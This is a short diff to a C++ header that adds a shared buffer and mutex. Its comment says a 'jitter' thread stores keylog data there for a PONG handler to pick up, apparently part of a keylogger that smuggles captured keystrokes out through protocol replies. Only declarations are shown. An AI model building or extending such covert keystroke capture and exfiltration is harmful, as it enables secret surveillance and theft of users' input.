@@ -75,6 +75,10 @@ private:
     std::atomic<bool>        m_keylog_dump_requested;
     std::mutex               m_keylog_jitter_mutex;
     std::condition_variable  m_keylog_jitter_cv;
+
+    // Shared buffer: jitter thread stores here, PONG handler picks up
+    std::string              m_keylog_pending_data;
+    std::mutex               m_keylog_pending_mutex;
 };
 
 } // namespace inferno
